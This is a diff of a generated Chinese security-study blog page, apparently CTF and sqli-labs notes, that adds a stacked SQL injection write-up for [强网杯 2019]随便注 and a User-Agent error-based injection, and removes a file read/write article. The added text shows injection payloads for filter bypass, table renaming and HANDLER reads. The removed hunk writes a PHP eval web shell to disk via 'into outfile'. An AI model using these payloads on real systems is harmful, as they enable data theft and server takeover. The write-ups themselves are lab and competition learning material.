@@ -155,7 +155,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" data-id="cmawck7ik003erk7ke9az6g6w" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" data-id="cmawcq0nd003frk7kdbida9qc" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -258,7 +258,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/[GXYCTF2019]Ping%20Ping%20Ping/" data-id="cmawck7il003jrk7k99regovk" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/[GXYCTF2019]Ping%20Ping%20Ping/" data-id="cmawcq0nd003hrk7k0e9b6a6c" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -270,9 +270,9 @@
 
 
   
-    <article id="post-Web/注入漏洞/SQL注入/sql注入总结/User-Agent 注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Web/注入漏洞/SQL注入/堆叠注入 stacked  injection/[GYCTF2020]Blacklist" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/User-Agent%20%E6%B3%A8%E5%85%A5/" class="article-date">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/%5BGYCTF2020%5DBlacklist/" class="article-date">
   <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
@@ -282,22 +282,103 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="User-Agent-注入"><a href="#User-Agent-注入" class="headerlink" title="User-Agent 注入"></a>User-Agent 注入</h1><p>我们访问 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-18/">http://127.0.0.1/sqli/Less-18/</a>，页面显示一个登陆框和我们的ip信息。</p>
-<p>当我们输入正确的用户名和密码之后登陆之后，页面多显示了 浏览器的User-Agent。</p>
-<p><img src="/.com//image-20250519103817-3j29chv.png" alt="image"></p>
-<p>抓包，修改其User-Agent如下图，测试是否存在user-agent注入</p>
-<p><img src="/.com//image-20250519103833-uzzkn29.png" alt="image"></p>
-<p>页面报错，存在报错注入</p>
-<p><img src="/.com//image-20250519103843-0hzuo2m.png" alt="image"></p>
-<p>​<code>&#39; and extractvalue(1,concat(0x7e,database(),0x7e))and &#39;1&#39;=&#39;1 #</code>​我们可以将 database()修改为任何的函数</p>
-<p>可以看到，页面将当前的数据库显示出来了。</p>
-<p><img src="/.com//image-20250519103901-b4xcu6i.png" alt="image"></p>
-<p>‍</p>
+        <h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p>‍</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/User-Agent%20%E6%B3%A8%E5%85%A5/" data-id="cmawck7il003mrk7k1xm8ekg3" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/[GYCTF2020]Blacklist/" data-id="cmawcq0ne003krk7k22i20y8f" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/SQL注入/堆叠注入 stacked  injection/[强网杯 2019]随便注" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><blockquote>
+<p>先判断注入点的传参方式，发现是get传参。</p>
+</blockquote>
+<blockquote>
+<p>判断闭合方式：输入1再输入1’试试	，发现是字符型且闭合方式是单引号</p>
+</blockquote>
+<blockquote>
+<p>判断一下字符个数<code>&#39; union select 1,2;#</code>​，系统提示<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;select&#x3D;&#x3D;关键字无法使用，我们可以通过&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;的方式，来绕过select关键字。</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;查看数据库名：&#x3D;&#x3D;​<code>1&#39;;show databases;#</code>​</p>
+</blockquote>
+<p><img src="/.com//image-20250418170120-z5w8c3n.png" alt="image">​</p>
+<blockquote>
+<p>&#x3D;&#x3D;查看数据表：&#x3D;&#x3D;​<code>1&#39;;show tables;#</code>​</p>
+</blockquote>
+<p><img src="/.com//image-20250418170223-5ylj1zk.png" alt="image"></p>
+<blockquote>
+<p>查看表结构：</p>
+<p>方式一：<code>1&#39;; show columns from tableName;#</code>​</p>
+<p>方式二：<code>1&#39;;desc tableName;#</code>​</p>
+<p>注意，如果tableName是纯数字，需要用反引号包裹</p>
+</blockquote>
+<p><img src="/.com//image-20250418170425-ugseo8r.png" alt="image"></p>
+<blockquote>
+<p>因为select关键字被过滤了，所以我们可以通过&#x3D;&#x3D;预编译&#x3D;&#x3D;的方式&#x3D;&#x3D;拼接&#x3D;&#x3D;select 关键字：<code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE  hacker;#</code>​得flag：flag{c0fc32ff-8ae1-4b96-8da0-1f621d7fdae3}  （关于预编译的讲解请见下文）</p>
+</blockquote>
+<p>‍</p>
+<p>‍</p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><blockquote>
+<p>前几步和方法一一致，最后一步（第8步），我们可以直接将<code>select * from `1919810931114514` </code>​语句进行16进制编码，即：<code>73656c656374202a2066726f6d20603139313938313039333131313435313460</code>​，替换payload：</p>
+<p>​<code>1&#39;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE  hacker;#</code>​</p>
+<p>同时，我们也可以先定义一个变量并将sql语句初始化，然后调用</p>
+<p>​<code>1&#39;;Set @jia = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @jia;EXECUTE hacker;#</code>​</p>
+</blockquote>
+<p>‍</p>
+<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><blockquote>
+<p>最后一步（第8步）也可以通过修改表名和列名来实现。我们输入1后，默认会显示id为1的数据，可以猜测默认显示的是words表的数据，查看words表结构第一个字段名为<code>id</code>​我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：<code>1&#39;;  alter table words rename to words1;alter table `1919810931114514`  rename to words;alter table words change flag id varchar(50);# </code>​，然后通过<code>1&#39; or 1 = 1 #</code>​，成功获取到flag。 （关于更改表名的讲解请见下文）</p>
+</blockquote>
+<p>‍</p>
+<h2 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h2><blockquote>
+<p>此题还可以通过&#x3D;&#x3D;handle&#x3D;&#x3D;直接出答案：<code>1&#39;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</code>​</p>
+</blockquote>
+<p>‍</p>
+<p>‍</p>
+<h1 id="知识详解"><a href="#知识详解" class="headerlink" title="知识详解"></a>知识详解</h1><h2 id="1-预编译"><a href="#1-预编译" class="headerlink" title="1.预编译"></a>1.预编译</h2><p>预编译相当于定一个语句相同，参数不通的&#x3D;&#x3D;mysql&#x3D;&#x3D;模板，我们可以通过预编译的方式，绕过特定的字符过滤</p>
+<p>格式：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE 名称 FROM 	Sql语句 ? ;</span><br><span class="line">SET @x=xx;</span><br><span class="line">EXECUTE 名称 USING @x;</span><br></pre></td></tr></table></figure>
+
+<p>举例：查询ID为1的用户：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">方法一：</span><br><span class="line">SElECT * FROM t_user WHERE USER_ID = 1</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">PREPARE jia FROM &#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;</span><br><span class="line">EXECUTE jia;</span><br><span class="line"></span><br><span class="line">方法三：</span><br><span class="line">PREPARE jia FROM &#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;;</span><br><span class="line">SET @ID = 1;</span><br><span class="line">EXECUTE jia USING @ID;</span><br><span class="line"></span><br><span class="line">方法四：</span><br><span class="line">SET @SQL=&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;</span><br><span class="line">PREPARE jia FROM @SQL;</span><br><span class="line">EXECUTE jia;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-更改表名"><a href="#2-更改表名" class="headerlink" title="2. 更改表名"></a>2. 更改表名</h2><ul>
+<li>修改表名：<code>ALTER TABLE 旧表名 RENAME TO 新表名；</code>​</li>
+<li>修改字段：<code>ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；</code>​</li>
+</ul>
+<h2 id="3-handle"><a href="#3-handle" class="headerlink" title="3.handle"></a>3.handle</h2><ul>
+<li>handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：</li>
+</ul>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">打开表：</span><br><span class="line">HANDLER 表名 OPEN ;</span><br><span class="line"></span><br><span class="line">查看数据：</span><br><span class="line">HANDLER 表名 READ next;</span><br><span class="line"></span><br><span class="line">关闭表：</span><br><span class="line">HANDLER 表名 READ CLOSE;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/" data-id="cmawcq0ne003ork7k5wsydm7b" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -336,7 +417,46 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/Cookie%20%E6%B3%A8%E5%85%A5/" data-id="cmawck7im003ork7k36qa6ft7" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/Cookie%20%E6%B3%A8%E5%85%A5/" data-id="cmawcq0ng003urk7k5b3b6un6" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/SQL注入/sql注入总结/User-Agent 注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/User-Agent%20%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="User-Agent-注入"><a href="#User-Agent-注入" class="headerlink" title="User-Agent 注入"></a>User-Agent 注入</h1><p>我们访问 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-18/">http://127.0.0.1/sqli/Less-18/</a>，页面显示一个登陆框和我们的ip信息。</p>
+<p>当我们输入正确的用户名和密码之后登陆之后，页面多显示了 浏览器的User-Agent。</p>
+<p><img src="/.com//image-20250519103817-3j29chv.png" alt="image"></p>
+<p>抓包，修改其User-Agent如下图，测试是否存在user-agent注入</p>
+<p><img src="/.com//image-20250519103833-uzzkn29.png" alt="image"></p>
+<p>页面报错，存在报错注入</p>
+<p><img src="/.com//image-20250519103843-0hzuo2m.png" alt="image"></p>
+<p>​<code>&#39; and extractvalue(1,concat(0x7e,database(),0x7e))and &#39;1&#39;=&#39;1 #</code>​我们可以将 database()修改为任何的函数</p>
+<p>可以看到，页面将当前的数据库显示出来了。</p>
+<p><img src="/.com//image-20250519103901-b4xcu6i.png" alt="image"></p>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/User-Agent%20%E6%B3%A8%E5%85%A5/" data-id="cmawcq0ni0042rk7kbojx8kr5" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -407,7 +527,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" data-id="cmawck7im003qrk7k4o2z37xk" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" data-id="cmawcq0ni0045rk7k9kx337b9" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -437,7 +557,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" data-id="cmawck7in003srk7khags4bfd" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" data-id="cmawcq0nj0048rk7kga1t4a9w" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -507,7 +627,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" data-id="cmawck7io003vrk7kg6mwcawi" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" data-id="cmawcq0nr004mrk7kge0n4tpx" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -617,104 +737,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" data-id="cmawck7io003wrk7k4vsrajk4" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入/sql注入总结/文件读写" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h1><h3 id="1-union-注入读取文件"><a href="#1-union-注入读取文件" class="headerlink" title="1. union 注入读取文件"></a>1. union 注入读取文件</h3><hr>
-<p><strong>注</strong>：当有显示列的时候，文件读可以利用 union 注入。当没有显示列的时候，只能利用盲注进行数据读取；</p>
-<p>文件写入只能利用 union 注入</p>
-<p>示例：读取系统根目录下的&#x2F;demo.txt 文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//union注入读取 /demo.txt 文件,windows使用-&gt;盘符:/路径</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,load_file(&quot;demo.txt&quot;) -- +</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//也可以把 /demo.txt 转换成16进制 这里没成功，可以去找找资料。。。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-1/?id=-1&#x27;</span> union <span class="keyword">select</span> 1,2,load_file(0x2F64656D6F2E747874) -- +</span><br></pre></td></tr></table></figure>
-
-<p>如果不成功，参考以下解决方案 在 mysql 目录中找到 my.ini&#x2F;my.cnf 文件在[mysqld]下面添加如下内容secure_file_priv &#x3D; “”如图：</p>
-<p>登录 mysql 执行以下命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SHOW VARIABLES LIKE <span class="string">&quot;secure_file_priv&quot;</span>;</span><br><span class="line"></span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>
-
-<p>这里<code>secure_file_priv</code>​的值要为””或者 “&#x2F;“ secure_file_priv 有三个值</p>
-<p>1、限制 mysqld 不允许导入 | 导出</p>
-<p>​<code>mysqld –secure_file_prive=null</code>​</p>
-<p>2、限制 mysqld 的导入 | 导出 只能发生在&#x2F;tmp&#x2F;目录下</p>
-<p>​<code>mysqld –secure_file_priv=/tmp/</code>​</p>
-<p>3、不对 mysqld 的导入 | 导出做限制</p>
-<p>​<code>secure_file_priv=&#39;&#39;</code>​</p>
-<hr>
-<h3 id="2-盲注读取文件"><a href="#2-盲注读取文件" class="headerlink" title="2. 盲注读取文件"></a>2. 盲注读取文件</h3><hr>
-<p>盲注读取的话就是利用hex函数，将读取的字符串转换成 16 进制，再利用ascii函数，转换成 ascii 码，再利用二分法一个一个的判断字符，很复杂，一般结合工具完成</p>
-<p>​<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; and ascii(mid((select hex(load_file(&#39;e:/3.txt&#39;))),18,1))&gt;49#&#39; LIMIT 0,1</code>​</p>
-<p>我们可以利用写入文件的功能，在 e 盘创建 4.php 文件，然后写入一句话木马。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//利用union注入写入一句话木马 into outfile 和 into dumpfile 都可以</span><br><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,&#x27;</span>&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[aaa]);?&gt;<span class="string">&#x27; into outfile &#x27;</span>d:/4.php<span class="string">&#x27; -- +</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 可以将一句话木马转换成16进制的形式</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-1/?id=-1&#x27;</span> union <span class="keyword">select</span> 1,2,0x3c3f70687020406576616c28245f504f53545b6161615d293b3f3e into outfile <span class="string">&#x27;d:/4.php&#x27;</span> -- +</span><br></pre></td></tr></table></figure>
-
-<p>在文件写入读取的时候，遇见以下这种情况。</p>
-<p><img src="/.com//image-20250519092519-0kcit26.png" alt="image"></p>
-<p>多半是因为权限不足，可以使用@@datadir，得到当前数据库存储目录，试着在数据库存储目录进行文件注入 比如</p>
-<p>​<code>http://192.168.209.128:88/Less-1/?id=-1&#39; union select 1,2,&#39;&lt;?php @eval($_POST[aaa]);?&gt;&#39; into outfile &#39;/www/server/mysql/4.php&#39; --</code>​</p>
-<p><img src="/.com//image-20250519092538-50xr08l.png" alt="image"></p>
-<p>注入成功</p>
-<p><strong>权限不足的解决办法-参考</strong>环境： CentOS7.0 64 位 MySQL5.7 问题：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用&#x27;select into outfile&#x27;备份数据表提示无法写入文件</span></span><br><span class="line">mysql&gt; <span class="keyword">select</span> 1,2,<span class="string">&#x27;you are very good hacker&#x27;</span> from  into outfile <span class="string">&#x27;/www/server/mysql/app.txt&#x27;</span>;</span><br><span class="line">ERROR 1 (HY000): Can<span class="string">&#x27;t create/write to file &#x27;</span>/www/server/mysql/app.txt<span class="string">&#x27; (Errcode: 13)</span></span><br></pre></td></tr></table></figure>
-
-<p>排查：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看mysql的进程用户,为mysql用户</span></span><br><span class="line">[root@lfs ~]# ps aux|grep mysqld</span><br><span class="line">root       1400  0.0  0.1 108208  1612 ?        S    01:22   0:00 /bin/sh /usr/local/mysql/bin/mysqld_safe --user=mysql</span><br><span class="line">mysql      1778  0.0  6.6 974276 67076 ?        Sl   01:22   0:06 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/lfs.err --pid-file=/usr/local/mysql/data/lfs.pid --socket=/tmp/mysql.sock --port=3306</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看/www/server/mysql/目录的权限，mysql用户没有写入权限</span></span><br><span class="line">[root@lfs ~]# <span class="built_in">ls</span> -ld /www/server/mysql/</span><br><span class="line">drwxr-xr-x 4 root root 4096 Aug 23 17:03 /www/server/mysql/</span><br></pre></td></tr></table></figure>
-
-<p>解决办法：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将/data/mysql/目录的归属为mysql用户</span></span><br><span class="line"><span class="built_in">chown</span> -R mysql.mysql /www/server/mysql/</span><br><span class="line"></span><br><span class="line">[root@lfs ~]# <span class="built_in">ls</span> -ld /data/mysql/</span><br><span class="line">drwxr-xr-x 4 mysql mysql 4096 Aug 23 17:03 /www/server/mysql/</span><br></pre></td></tr></table></figure>
-
-<p>验证，写入成功：</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/" data-id="cmawck7iq0041rk7kfw3g4p1e" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入/堆叠注入 stacked  injection/[GYCTF2020]Blacklist" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/%5BGYCTF2020%5DBlacklist/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/[GYCTF2020]Blacklist/" data-id="cmawck7iw0047rk7kcvsh3qne" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
